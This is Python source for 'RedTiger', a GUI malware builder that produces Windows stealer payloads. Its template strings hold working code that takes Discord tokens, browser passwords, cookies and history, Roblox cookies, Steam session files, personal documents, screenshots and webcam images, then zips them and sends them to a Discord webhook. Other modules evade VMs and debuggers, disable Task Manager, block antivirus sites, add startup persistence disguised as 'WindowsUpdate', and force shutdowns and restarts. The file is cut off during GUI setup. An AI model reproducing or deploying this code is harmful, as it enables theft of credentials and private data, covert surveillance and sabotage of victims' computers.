

import sys
import os
import time
import subprocess
import shutil
import random
import string
import ast
import base64
import json
import requests
import customtkinter as ctk
import tkinter
from tkinter import filedialog, messagebox
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend


version_tool = "4.0"
name_tool = "RedTiger"
tool_path = os.path.dirname(os.path.abspath(__file__))
github_tool = "https://github.com/RedTigerToken"
avatar_webhook = "https://cdn.discordapp.com/attachments/1188169110370324562_"
username_webhook = "RedTiger"
color_webhook = 16711680
website = "https://sites.google.com/view/redtiger"


white = "\033[1;37m"
red = "\033[1;31m"
reset = "\033[0m"

BEFORE = "\033[1;37m["
AFTER = "]\033[1;37m"
INFO = "\033[1;37m[>]\033[1;37m"
ERROR = "\033[1;37m[!]\033[1;37m"
WAIT = "\033[1;37m[~]\033[1;37m"
ADD = "\033[1;37m[+]\033[1;37m"
BEFORE_GREEN = "\033[1;37m["
AFTER_GREEN = "]\033[1;32m"

def current_time_hour():
    return time.strftime("%H:%M:%S")

def ErrorModule(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Module Error: {white}{e}{reset}")
    input("Press enter to exit...")
    sys.exit(1)

def Error(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error: {white}{e}{reset}")
    input("Press enter to exit...")
    sys.exit(1)

def Continue():
    input(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Press enter to continue...")

def Reset():
    python = sys.executable
    os.execl(python, python, *sys.argv)

def Slow(text):
    for line in text.splitlines():
        print(line)
        time.sleep(0.1)

def CheckWebhook(webhook):
    try:
        response = requests.get(webhook, timeout=10)
        return response.status_code == 200
    except:
        return False

def Title(title):
    if sys.platform.startswith("win"):
        os.system(f"title {title}")
    elif sys.platform.startswith("linux"):
        print(f"\033]0;{title}\a", end='', flush=True)


virus_banner = f"""
{red}  _____           _    _____ _                    
{red} |  __ \\         | |  / ____| |                   
{red} | |__) |___  ___| |_| |  __| | ___  __ _ _ __ ___ 
{red} |  _  // _ \\/ __| __| | |_ | |/ _ \\/ _` | '__/ __|
{red} | | \\ \\  __/ (__| |_| |__| | |  __/ (_| | |  \\__ \\
{red} |_|  \\_\\___|\\___|\\__|\\_____|_|\\___|\\__,_|_|  |___/
{red}                                                   
{red}                                                   
{white}              Version: {version_tool}
{white}          Github: {github_tool}
"""


Ant1VM4ndD3bug = """
import sys
import platform
import psutil

def check_vm():
    vm_indicators = [
        "vbox" in platform.system().lower(),
        "vmware" in platform.system().lower(),
        "qemu" in platform.system().lower(),
        "virtual" in platform.system().lower(),
        any("vmware" in str(disk).lower() for disk in psutil.disk_partitions()),
        any("virtual" in str(disk).lower() for disk in psutil.disk_partitions())
    ]
    return any(vm_indicators)

def check_debugger():
    try:
        import ctypes
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0
    except:
        return False

if check_vm() or check_debugger():
    sys.exit()
"""

Obligatory = """
import os
import sys
import requests
import base64
import json
import threading
import time
import tempfile
import zipfile
import io
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

WEBHOOK_URL = "%WEBHOOK_URL%"
KEY = "%KEY%"
AVATAR_URL = "%LINK_AVATAR%"
GITHUB_URL = "%LINK_GITHUB%"
WEBSITE_URL = "%LINK_WEBSITE%"

def decrypt(encrypted_message, key):
    try:
        encrypted_message = base64.b64decode(encrypted_message)
        salt = encrypted_message[:16]
        iv = encrypted_message[16:32]
        encrypted_data = encrypted_message[32:]
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        derived_key = kdf.derive(key.encode())
        
        cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(encrypted_data) + decryptor.finalize()
        
        unpadder = padding.PKCS7(128).unpadder()
        decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
        
        return decrypted.decode()
    except Exception as e:
        return None

webhook = decrypt(WEBHOOK_URL, KEY)

def send_embed(title, description, color=16711680):
    if not webhook:
        return
    embed = {
        "title": title,
        "description": description,
        "color": color,
        "footer": {
            "text": "RedTiger",
            "icon_url": AVATAR_URL
        }
    }
    try:
        requests.post(webhook, json={"embeds": [embed], "username": "RedTiger", "avatar_url": AVATAR_URL})
    except:
        pass

def send_zip_file(zip_data, zip_name="data.zip", message="Data collected"):
    if not webhook:
        return
    try:
        files = {'file': (zip_name, zip_data)}
        data = {
            'username': 'RedTiger',
            'avatar_url': AVATAR_URL,
            'content': message
        }
        requests.post(webhook, data=data, files=files)
    except:
        pass

def collect_all_data():
    all_data = {}
    
    # Informations système
    try:
        import platform
        import socket
        import getpass
        
        system_info = f"Computer: {socket.gethostname()}\\n"
        system_info += f"User: {getpass.getuser()}\\n"
        system_info += f"OS: {platform.system()} {platform.release()}\\n"
        system_info += f"Processor: {platform.processor()}\\n"
        all_data['system_info.txt'] = system_info.encode()
    except:
        all_data['system_info.txt'] = b"System info not available"

    # Fichiers intéressants
    try:
        interesting_files_content = []
        interesting_extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', 
                                 '.jpg', '.jpeg', '.png', '.zip', '.rar', '.7z', '.key', '.pem', 
                                 '.ovpn', '.kdbx', '.wallet', '.dat', '.log', '.config', '.json']
        
        user_profile = os.getenv('USERPROFILE')
        locations = [user_profile, os.path.join(user_profile, 'Desktop'), os.path.join(user_profile, 'Documents')]
        
        for location in locations:
            if os.path.exists(location):
                for root, dirs, files in os.walk(location):
                    for file in files:
                        if any(file.endswith(ext) for ext in interesting_extensions):
                            file_path = os.path.join(root, file)
                            try:
                                if os.path.getsize(file_path) < 5 * 1024 * 1024:  # 5MB max
                                    with open(file_path, 'rb') as f:
                                        relative_path = os.path.relpath(file_path, user_profile)
                                        all_data[f'files/{relative_path}'] = f.read()
                            except:
                                pass
    except:
        pass

    # Tokens Discord
    try:
        import win32crypt
        from Crypto.Cipher import AES
        discord_tokens = []
        discord_paths = [
            os.path.join(os.getenv('APPDATA'), 'Discord'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Discord')
        ]
        
        for path in discord_paths:
            if os.path.exists(path):
                local_state_path = os.path.join(path, 'Local State')
                if os.path.exists(local_state_path):
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.loads(f.read())
                    
                    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
                    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                    
                    db_path = os.path.join(path, 'Local Storage', 'leveldb')
                    if os.path.exists(db_path):
                        for file_name in os.listdir(db_path):
                            if file_name.endswith('.ldb'):
                                file_path = os.path.join(db_path, file_name)
                                try:
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        import re
                                        tokens = re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', content)
                                        discord_tokens.extend(tokens)
                                except:
                                    pass
        
        if discord_tokens:
            all_data['discord_tokens.txt'] = '\\n'.join(discord_tokens).encode()
    except:
        all_data['discord_tokens.txt'] = b"No Discord tokens found"

    # Mots de passe navigateur
    try:
        import shutil
        import sqlite3
        browser_passwords = []
        
        browsers = {
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
        }
        
        for browser, login_data_path in browsers.items():
            if os.path.exists(login_data_path):
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), 'temp_login.db')
                    shutil.copy2(login_data_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for url, username, password in cursor.fetchall():
                        if username and password:
                            try:
                                decrypted = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                                if decrypted:
                                    browser_passwords.append(f"{browser} - {url} - {username}:{decrypted.decode()}")
                            except:
                                pass
                    
                    conn.close()
                    os.unlink(temp_db)
                except:
                    pass
        
        if browser_passwords:
            all_data['browser_passwords.txt'] = '\\n'.join(browser_passwords).encode()
    except:
        all_data['browser_passwords.txt'] = b"No browser passwords found"

    # Cookies navigateur
    try:
        browser_cookies = []
        for browser, login_data_path in browsers.items():
            cookies_path = login_data_path.replace('Login Data', 'Cookies')
            if os.path.exists(cookies_path):
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), 'temp_cookies.db')
                    shutil.copy2(cookies_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value FROM cookies")
                    
                    for host, name, value in cursor.fetchall():
                        browser_cookies.append(f"{browser} - {host} - {name}: {value}")
                    
                    conn.close()
                    os.unlink(temp_db)
                except:
                    pass
        
        if browser_cookies:
            all_data['browser_cookies.txt'] = '\\n'.join(browser_cookies).encode()
    except:
        all_data['browser_cookies.txt'] = b"No browser cookies found"

    # Historique navigateur
    try:
        browser_history = []
        for browser, login_data_path in browsers.items():
            history_path = login_data_path.replace('Login Data', 'History')
            if os.path.exists(history_path):
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), 'temp_history.db')
                    shutil.copy2(history_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 100")
                    
                    for url, title, count in cursor.fetchall():
                        browser_history.append(f"{browser} - {url} - {title} (Visits: {count})")
                    
                    conn.close()
                    os.unlink(temp_db)
                except:
                    pass
        
        if browser_history:
            all_data['browser_history.txt'] = '\\n'.join(browser_history).encode()
    except:
        all_data['browser_history.txt'] = b"No browser history found"

    # Fichiers de session
    try:
        session_files_info = []
        targets = [
            (os.path.join(os.getenv('LOCALAPPDATA'), 'Steam'), 'Steam'),
            (os.path.join(os.getenv('APPDATA'), 'Telegram Desktop'), 'Telegram'),
            (os.path.join(os.getenv('APPDATA'), 'Signal'), 'Signal'),
            (os.path.join(os.getenv('APPDATA'), 'Discord'), 'Discord')
        ]
        
        for path, name in targets:
            if os.path.exists(path):
                session_files_info.append(f"{name}: {path}")
                # Essayer de sauvegarder des fichiers spécifiques
                if name == 'Steam':
                    config_path = os.path.join(path, 'config')
                    if os.path.exists(config_path):
                        for file in os.listdir(config_path):
                            if file.endswith('.vdf'):
                                file_path = os.path.join(config_path, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        all_data[f'session/{name}/{file}'] = f.read()
                                except:
                                    pass
        
        if session_files_info:
            all_data['session_files.txt'] = '\\n'.join(session_files_info).encode()
    except:
        all_data['session_files.txt'] = b"No session files found"

    # Roblox cookies
    try:
        import browser_cookie3
        roblox_cookies = []
        try:
            cookies = browser_cookie3.chrome(domain_name='roblox.com')
            for cookie in cookies:
                if 'roblox' in cookie.domain:
                    roblox_cookies.append(f"{cookie.name}: {cookie.value}")
        except:
            pass
        
        if roblox_cookies:
            all_data['roblox_cookies.txt'] = '\\n'.join(roblox_cookies).encode()
    except:
        all_data['roblox_cookies.txt'] = b"No Roblox cookies found"

    # Screenshot
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        all_data['screenshot.png'] = img_byte_arr.getvalue()
    except:
        all_data['screenshot.png'] = b"Screenshot not available"

    # Webcam
    try:
        import cv2
        camera = cv2.VideoCapture(0)
        if camera.isOpened():
            ret, frame = camera.read()
            if ret:
                _, img_encoded = cv2.imencode('.jpg', frame)
                all_data['webcam.jpg'] = img_encoded.tobytes()
            camera.release()
    except:
        all_data['webcam.jpg'] = b"Webcam not available"

    return all_data

def send_all_data():
    try:
        all_data = collect_all_data()
        
        # Créer le ZIP
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for filename, content in all_data.items():
                zip_file.writestr(filename, content)
        
        zip_data = zip_buffer.getvalue()
        
        # Envoyer le ZIP
        computer_name = os.getenv('COMPUTERNAME', 'Unknown')
        username = os.getenv('USERNAME', 'Unknown')
        message = f"🚨 **DATA COLLECTED** 🚨\\n💻 Computer: `{computer_name}`\\n👤 User: `{username}`\\n📦 Total files: `{len(all_data)}`"
        
        send_zip_file(zip_data, f"collected_data_{computer_name}_{username}.zip", message)
        send_embed("Data Collection Complete", f"Successfully collected and sent {len(all_data)} files from {username}@{computer_name}")
        
    except Exception as e:
        send_embed("Data Collection Error", f"Error during data collection: {str(e)}")

def get_system_info():
    try:
        import platform
        import socket
        import getpass
        
        info = f"**System Information**\\n"
        info += f"Computer Name: {socket.gethostname()}\\n"
        info += f"Username: {getpass.getuser()}\\n"
        info += f"OS: {platform.system()} {platform.release()}\\n"
        info += f"Version: {platform.version()}\\n"
        info += f"Processor: {platform.processor()}\\n"
        info += f"Architecture: {platform.architecture()[0]}\\n"
        
        return info
    except Exception as e:
        return f"Error getting system info: {str(e)}"

def system_info():
    try:
        info = get_system_info()
        send_embed("System Information", info)
    except Exception as e:
        pass
"""

Sy5t3mInf0 = """
system_info()
"""

Di5c0rdAccount = """
def discord_tokens():
    send_all_data()

discord_tokens()
"""

Di5c0rdIj3ct10n = """
def discord_injection():
    try:
        discord_paths = [
            os.path.join(os.getenv('APPDATA'), 'Discord'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Discord'),
            os.path.join(os.getenv('APPDATA'), 'discordcanary'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'discordcanary'),
            os.path.join(os.getenv('APPDATA'), 'discordptb'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'discordptb')
        ]
        
        for path in discord_paths:
            if os.path.exists(path):
                send_embed("Discord Injection", f"Discord found at: {path}")
                break
    except Exception as e:
        pass

discord_injection()
"""

Int3r3stingFil3s = """
def find_interesting_files():
    send_all_data()

find_interesting_files()
"""

S3ssi0nFil3s = """
def steal_session_files():
    send_all_data()

steal_session_files()
"""

Br0w53r5t341 = """
def steal_browser_data():
    send_all_data()

steal_browser_data()
"""

R0b10xAccount = """
def get_roblox_cookies():
    send_all_data()

get_roblox_cookies()
"""

W3bc4m = """
def capture_webcam():
    send_all_data()

capture_webcam()
"""

Scr33n5h0t = """
def take_screenshot():
    send_all_data()

take_screenshot()
"""

B10ckK3y = """
def block_keys():
    try:
        import ctypes
        from ctypes import wintypes
        import threading
        
        def keyboard_block():
            while True:
                time.sleep(0.1)
        
        thread = threading.Thread(target=keyboard_block, daemon=True)
        thread.start()
        send_embed("Keyboard Block", "Keyboard blocking activated")
    except Exception as e:
        pass

block_keys()
"""

B10ckM0u53 = """
def block_mouse():
    try:
        import ctypes
        import threading
        
        def mouse_block():
            while True:
                time.sleep(0.1)
        
        thread = threading.Thread(target=mouse_block, daemon=True)
        thread.start()
        send_embed("Mouse Block", "Mouse blocking activated")
    except Exception as e:
        pass

block_mouse()
"""

B10ckT45kM4n4g3r = """
def block_task_manager():
    try:
        import ctypes
        import winreg
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            send_embed("Task Manager Blocked", "Task Manager has been disabled")
        except:
            pass
    except Exception as e:
        pass

block_task_manager()
"""

B10ckW3b5it3 = """
def block_av_websites():
    try:
        import ctypes
        import winreg
        
        hosts_path = r"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts"
        blocked_sites = [
            "www.avast.com",
            "www.avg.com",
            "www.bitdefender.com",
            "www.kaspersky.com",
            "www.malwarebytes.com",
            "www.norton.com",
            "www.mcafee.com"
        ]
        
        try:
            with open(hosts_path, 'a') as hosts:
                for site in blocked_sites:
                    hosts.write(f"127.0.0.1 {site}\\n")
                    hosts.write(f"::1 {site}\\n")
            
            send_embed("AV Websites Blocked", "Antivirus websites have been blocked")
        except:
            pass
    except Exception as e:
        pass

block_av_websites()
"""

def F4k33rr0r(title, message):
    return f"""
def show_fake_error():
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, "{message}", "{title}", 0x10)
    except:
        pass

show_fake_error()
"""

Sp4m0p3nPr0gr4m = """
def spam_open_programs():
    try:
        import subprocess
        import threading
        
        programs = [
            "notepad.exe",
            "calc.exe",
            "mspaint.exe",
            "write.exe",
            "cmd.exe"
        ]
        
        def open_program(program):
            try:
                subprocess.Popen(program, shell=True)
            except:
                pass
        
        for program in programs:
            for _ in range(5):
                thread = threading.Thread(target=open_program, args=(program,))
                thread.start()
        
        send_embed("Program Spam", "Started spamming program openings")
    except Exception as e:
        pass

spam_open_programs()
"""

Sp4mCr34tFil3 = """
def spam_create_files():
    try:
        import threading
        
        def create_files():
            desktop = os.path.join(os.getenv('USERPROFILE'), 'Desktop')
            for i in range(50):
                try:
                    file_path = os.path.join(desktop, f'spam_file_{i}.txt')
                    with open(file_path, 'w') as f:
                        f.write('SPAM' * 1000)
                except:
                    pass
        
        thread = threading.Thread(target=create_files)
        thread.start()
        send_embed("File Spam", "Started creating spam files")
    except Exception as e:
        pass

spam_create_files()
"""

Shutd0wn = """
def shutdown_computer():
    try:
        import subprocess
        subprocess.run(["shutdown", "/s", "/t", "60"], shell=True)
        send_embed("Shutdown", "Computer will shutdown in 60 seconds")
    except:
        pass

shutdown_computer()
"""

St4rtup = """
def add_to_startup():
    try:
        import winreg
        import sys
        
        key = winreg.HKEY_CURRENT_USER
        subkey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        
        exe_path = sys.argv[0]
        
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        
        send_embed("Startup", "Added to startup successfully")
    except:
        pass

add_to_startup()
"""

Sp4mOpti0ns = """
spam_threads = []

def start_spam_functions():
    pass

start_spam_functions()
"""

R3st4rt = """
def restart_every_5min():
    try:
        import threading
        import subprocess
        
        def restart():
            while True:
                time.sleep(300)
                try:
                    subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
                except:
                    pass
        
        thread = threading.Thread(target=restart, daemon=True)
        thread.start()
        send_embed("Auto Restart", "Computer will restart every 5 minutes")
    except:
        pass

restart_every_5min()
"""

St4rt = """
if __name__ == "__main__":
    import threading
    
    functions = []
    
    functions.append(system_info) if 'system_info' in locals() else None
    functions.append(discord_tokens) if 'discord_tokens' in locals() else None
    functions.append(discord_injection) if 'discord_injection' in locals() else None
    functions.append(find_interesting_files) if 'find_interesting_files' in locals() else None
    functions.append(steal_session_files) if 'steal_session_files' in locals() else None
    functions.append(steal_browser_data) if 'steal_browser_data' in locals() else None
    functions.append(get_roblox_cookies) if 'get_roblox_cookies' in locals() else None
    functions.append(capture_webcam) if 'capture_webcam' in locals() else None
    functions.append(take_screenshot) if 'take_screenshot' in locals() else None
    functions.append(block_keys) if 'block_keys' in locals() else None
    functions.append(block_mouse) if 'block_mouse' in locals() else None
    functions.append(block_task_manager) if 'block_task_manager' in locals() else None
    functions.append(block_av_websites) if 'block_av_websites' in locals() else None
    functions.append(show_fake_error) if 'show_fake_error' in locals() else None
    functions.append(spam_open_programs) if 'spam_open_programs' in locals() else None
    functions.append(spam_create_files) if 'spam_create_files' in locals() else None
    functions.append(shutdown_computer) if 'shutdown_computer' in locals() else None
    functions.append(add_to_startup) if 'add_to_startup' in locals() else None
    functions.append(restart_every_5min) if 'restart_every_5min' in locals() else None
    
    # Fonction principale qui collecte tout
    def collect_and_send_all():
        send_all_data()
    
    # Lancer la collecte principale
    main_thread = threading.Thread(target=collect_and_send_all, daemon=True)
    main_thread.start()
    
    # Lancer les autres fonctions
    for func in functions:
        try:
            thread = threading.Thread(target=func, daemon=True)
            thread.start()
        except:
            pass
    
    try:
        while True:
            time.sleep(1)
    except:
        pass
"""




try:
    exit_window = False

    colors = {
        "white": "#ffffff",
        "red": "#a80505",
        "dark_red": "#800000",
        "dark_gray": "#1e1e1e",
        "gray": "#444444",
        "light_gray": "#949494",
        "background": "#262626"
    }

    def ClosingWindow():
        global exit_window
        exit_window = True
        after_ids = builder.tk.eval('after info').split()
        for after_id in after_ids:
            try: 
                builder.after_cancel(after_id)
            except: 
                pass
        try: 
            builder.quit()
        except: 
            pass
        try: 
            builder.destroy()
        except: 
            pass

    def ClosingBuild():
        after_ids = builder.tk.eval('after info').split()
        for after_id in after_ids:
            try: 
                builder.after_cancel(after_id)
            except: 
                pass
        try: 
            builder.quit()
        except: 
            pass
        try: 
            builder.destroy()
        except: 
            pass

    builder = ctk.CTk()
    builder.title(f"RedTiger {version_tool} - Virus Builder")
    builder.geometry("800x720")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    
    icon_path_img = os.path.join(tool_path, "Img", "RedTiger_icon.ico")
    if os.path.exists(icon_path_img):
        builder.iconbitmap(icon_path_img)


    option_system_var = ctk.StringVar(value="Disable")
    option_game_launchers_var = ctk.StringVar(value="Disable")
    option_wallets_var = ctk.StringVar(value="Disable")
    option_apps_var = ctk.StringVar(value="Disable")
    option_roblox_var = ctk.StringVar(value="Disable")
    option_discord_var = ctk.StringVar(value="Disable")
    option_discord_injection_var = ctk.StringVar(value="Disable")
    option_passwords_var = ctk.StringVar(value="Disable")
    option_cookies_var = ctk.StringVar(value="Disable")
    option_history_var = ctk.StringVar(value="Disable")
    option_downloads_var = ctk.StringVar(value="Disable")
    option_cards_var = ctk.StringVar(value="Disable")
    option_extentions_var = ctk.StringVar(value="Disable")
    option_interesting_files_var = ctk.StringVar(value="Disable")
    option_webcam_var = ctk.StringVar(value="Disable")
    option_screenshot_var = ctk.StringVar(value="Disable")
    option_block_key_var = ctk.StringVar(value="Disable")
    option_block_mouse_var = ctk.StringVar(value="Disable")
    option_block_task_manager_var = ctk.StringVar(value="Disable")
    option_block_website_var = ctk.StringVar(value="Disable")
    option_shutdown_var = ctk.StringVar(value="Disable")
    option_spam_open_programs_var = ctk.StringVar(value="Disable")
    option_spam_create_files_var = ctk.StringVar(value="Disable")
    option_fake_error_var = ctk.StringVar(value="Disable")
    option_startup_var = ctk.StringVar(value="Disable")
    option_restart_var = ctk.StringVar(value="Disable")
    option_anti_vm_and_debug_var = ctk.StringVar(value="Disable")
    file_type_var = ctk.StringVar(value="File Type")

    def ErrorLogs(message):
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {message + white}")
        messagebox.showerror(f"RedTiger {version_tool} - Virus Builder", message)

    def InfoLogs(message):
        messagebox.showinfo(f"RedTiger {version_tool} - Virus Builder", message)

    def TestWebhook():
        webhook = webhook_url.get()
        if CheckWebhook(webhook):
            InfoLogs("The webhook is valid.")
        else:
            ErrorLogs("The webhook is invalid.")

    Slow(virus_banner)
    

    title_frame = ctk.CTkFrame(builder, width=780, height=198, fg_color=colors["background"]) 
    title_frame.grid(row=1, column=0, sticky="w", pady=(10, 0), padx=(10, 0))
    title_frame.grid_propagate(False)
    title_frame.grid_columnconfigure(0, weight=1)

    title = ctk.CTkLabel(title_frame, text="Virus Builder", font=ctk.CTkFont(family="Helvetica", size=40, weight="bold"), text_color=colors["red"])
    title.grid(row=1, pady=(10, 0), sticky="we", columnspan=3)

    text = ctk.CTkLabel(title_frame, text="The builder only creates viruses that work under Windows.", font=ctk.CTkFont(family="Helvetica", size=13), text_color=colors["red"])
    text.grid(row=2, pady=0, columnspan=3, sticky="we")

    url = ctk.CTkLabel(title_frame, text=github_tool, font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    url.grid(row=3, pady=(3, 10), columnspan=3, sticky="we")

    webhook_url = ctk.CTkEntry(title_frame, height=45, width=350, corner_radius=5, font=ctk.CTkFont(family="Helvetica", size=15), justify="center", border_color=colors["red"], fg_color=colors["dark_gray"], border_width=2, placeholder_text="https://discord.com/api/webhooks/...", text_color=colors['white'])
    webhook_url.grid(row=4, column=0, padx=(150, 5), pady=10, sticky="we")

    test_webhook = ctk.CTkButton(title_frame, text="Test Webhook", command=TestWebhook, height=45, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
    test_webhook.grid(row=4, column=1, padx=(5, 150), pady=10, sticky="we")


    options_stealer_frame = ctk.CTkFrame(builder, width=720, height=209, fg_color=colors["dark_gray"]) 
    options_stealer_frame.grid(row=2, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    options_stealer_frame.grid_propagate(False)
    options_stealer_frame.grid_columnconfigure(0, weight=1)
    options_stealer_frame.grid_columnconfigure(1, weight=1)
    options_stealer_frame.grid_columnconfigure(2, weight=1)


    options_malware_frame = ctk.CTkFrame(builder, width=720, height=150, fg_color=colors["dark_gray"]) 
    options_malware_frame.grid(row=3, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    options_malware_frame.grid_propagate(False)
    options_malware_frame.grid_columnconfigure(0, weight=1)
    options_malware_frame.grid_columnconfigure(1, weight=1)
    options_malware_frame.grid_columnconfigure(2, weight=1)

    def ChooseIcon():
        global icon_path
        try:
            if sys.platform.startswith("win"):
                root = tkinter.Tk()
                if os.path.exists(icon_path_img):
                    root.iconbitmap(icon_path_img)
                root.withdraw()
                root.attributes('-topmost', True)
                icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
            elif sys.platform.startswith("linux"):
                icon_path = filedialog.askopenfilename(title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
        except:
            pass
        
    fake_error_title = "Microsoft Excel"
    fake_error_message = "The file is corrupt and cannot be opened."
    fake_error_window_status = True

    def CreateFakeErrorWindow():
        global fake_error_window_status
        if fake_error_window_status:
            fake_error_window_status = False
        else:
            fake_error_window_status = True
            return

        fake_error_window = ctk.CTkToplevel(builder)
        fake_error_window.title(f"RedTiger {version_tool} - Fake Error")
        fake_error_window.geometry("300x250")
        fake_error_window.resizable(False, False)
        fake_error_window.configure(fg_color=colors["background"])

        fake_error_title_entry = ctk.CTkEntry(fake_error_window, justify="center", placeholder_text="Error Title", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=260)
        fake_error_title_entry.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="ew")

        fake_error_message_entry = ctk.CTkEntry(fake_error_window, justify="center", placeholder_text="Error Message", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=260)
        fake_error_message_entry.grid(row=1, column=0, padx=20, pady=(10, 20), sticky="ew")

        def Validate():
            global fake_error_title, fake_error_message
            fake_error_title = fake_error_title_entry.get()
            fake_error_message = fake_error_message_entry.get()
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake Error Title  : {white + fake_error_title}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake Error Message: {white + fake_error_message}")
            fake_error_window.destroy()
            
        validate_button = ctk.CTkButton(fake_error_window, text="Validate", command=Validate, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14), height=40, width=100)
        validate_button.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        fake_error_window.mainloop()

    option_system_cb = ctk.CTkCheckBox(options_stealer_frame, text="System Info", variable=option_system_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_wallets_cb = ctk.CTkCheckBox(options_stealer_frame, text="Wallets Session Files", variable=option_wallets_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_game_launchers_cb = ctk.CTkCheckBox(options_stealer_frame, text="Games Session Files", variable=option_game_launchers_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_apps_cb = ctk.CTkCheckBox(options_stealer_frame, text="Telegram Session Files", variable=option_apps_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_roblox_cb = ctk.CTkCheckBox(options_stealer_frame, text="Roblox Accounts", variable=option_roblox_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_discord_cb = ctk.CTkCheckBox(options_stealer_frame, text="Discord Accounts", variable=option_discord_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'], font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
